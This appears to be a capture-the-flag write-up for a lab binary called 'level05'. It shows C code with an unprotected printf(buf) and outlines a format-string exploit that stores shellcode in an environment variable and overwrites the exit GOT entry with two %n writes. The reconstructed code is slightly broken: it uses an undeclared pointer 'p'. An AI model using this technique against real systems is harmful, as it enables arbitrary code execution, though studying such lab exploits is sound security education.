int	main(void)
{
	int	i	= 0;
	char	buf[100];

	fgets(&buf, 100, stdin);
	for ( ; *p; ++p) *p = tolower(*p); // lowercase

	printf(buf);
	exit(0);
}

printf not protected we can export a shellcode then find its address with a program (printf("%p"^, getenv)) then we can overide exit in got table by our shellcode addr

objdump -R ./level05 to get exit addr (080497e0)

shellcode addr = 0xffffd50c

we can find the offset of our printf by printing "AAAA" + " %p" * 15 (we find 10)

to overide exit by the shellcode we will write our shellcode in 2 part (so we dont have to print 4*10^9 char)

exploit

"(exit GOT addr)" + "(exit GOT addr + 2 bytes)" + "%(last 2 bytes of our shellcode address (in this case should be "d50c")minus 8 cause we already printed 8 char)x%10$n" + "%(first 2 bytes of our shellcode address ("ffff") minus what we already printed (- "d50c" in this case))x%11$n"